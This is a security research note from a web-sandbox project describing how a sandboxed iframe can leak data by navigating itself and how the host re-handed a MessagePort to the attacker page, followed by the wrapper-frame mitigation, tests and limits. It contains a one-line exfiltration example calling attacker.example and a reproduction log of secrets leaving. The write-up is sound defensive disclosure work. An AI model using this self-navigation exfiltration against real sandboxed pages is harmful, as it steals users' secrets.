# Research 14: Self-Navigation Exfiltration and Port Hand-Off

*From the security review in [issue #6](https://github.com/MentalGear/web-sandbox/issues/6) (findings N1, N2).
Tracked as backlog **S10** and **S11**. Reproduced in Chromium against `main@a8885c5`.*

## Summary

A sandboxed frame with only `allow-scripts` could carry data out by navigating **itself**:

```javascript
location.href = 'https://attacker.example/?d=' + secret;
```

The `sandbox` flags only stop navigation of *other* browsing contexts (top, parent, popups without
`allow-popups`). No CSP directive restricts where a document may navigate itself (`navigate-to` was
dropped from the spec), and the guest's own `frame-src` governs only frames it embeds. The request
URL is the payload, so the exfiltration is complete when the request leaves.

It got worse after the navigation: the host called `setupChannel()` on every `load` of the frame,
so it posted a **fresh `MessagePort`** to whatever document had loaded, along with any queued
`execute()` code. The attacker's page received a live channel to the host, could spoof log lines,
and received host-supplied code.

Reproduction on the old code (`allow-scripts` only):

```
ATTACKER SERVER <- /evil.html?d=guest-secret-123        ← the secret leaves in the URL
HOST ready event #2                                     ← host re-handshakes with the attacker page
HOST got log: ["spoofed log from attacker page"]
ATTACKER SERVER <- /leak?code=...apiKey='HOST-SECRET-42'  ← host's execute() code reaches the attacker
```

## Key Observation

The **embedder's** `frame-src` is checked on every navigation of a child frame — including
navigations the child starts — and it is a *pre-request* check. A parent policy of
`frame-src 'none'` therefore blocks the guest's self-navigation before anything is sent, while the
initial `about:srcdoc` load is unaffected (it is not fetched).

The library cannot set the host page's CSP, so it owns an intermediate frame instead.

## Mitigation (implemented)

```
host page
└─ wrapper frame   srcdoc written entirely by the library, CSP: frame-src 'none', no script
   └─ guest frame  security block first, then untrusted content
```

`src/lib/frame-documents.ts`, `src/host.ts`:

1. **Wrapper frame (N1).** The guest frame's navigations are checked against the wrapper's
   `frame-src 'none'` and blocked pre-request. This covers script navigation, `window.open(…, '_self')`,
   link clicks, form submissions and meta refresh alike.
   - The wrapper's policy contains *only* `frame-src`: the guest `srcdoc` inherits it, so anything
     stricter would also restrict the guest.
   - The wrapper carries the same `sandbox` flags as the guest, because nested sandbox flags only
     ever add up.
   - The host reaches the guest as `wrapper.contentWindow.frames[0]`.
2. **One-shot channel (N2).** The port is posted exactly once per frame. A second `load` of the
   sandbox frame tears it down (port closed, queue dropped, frame removed) and fires a
   `terminated` event; `execute()` is refused until the next `setConfig()` / `load()`.

## Tests

| Test | Asserts | Old code |
| :--- | :--- | :--- |
| 14.1 `location.href` | no request reaches the attacker | ✘ |
| 14.1 `window.open(…, '_self')` | no request reaches the attacker | ✘ |
| 14.1 link click | no request reaches the attacker | ✘ |
| 14.1 meta refresh | no request reaches the attacker | flaky ✘ |
| 14.2 | a second document in the frame terminates the sandbox; no port, no code | ✘ |

## Limits

- Verified in Chromium. CI runs the suite in Firefox and WebKit as well; until those runs are green,
  treat the wrapper's protection in those engines as unconfirmed.
- Popups are new top-level windows, not child frames, so `frame-src` does not cover them. They are
  handled by moving `allow-popups` behind an explicit opt-in — see [research 13](../13_popup_exfiltration/README.md).
- A navigation to `about:srcdoc` (`location.reload()`) is not fetched and so not blocked. The reloaded
  guest never receives a port, so it only loses its own channel.
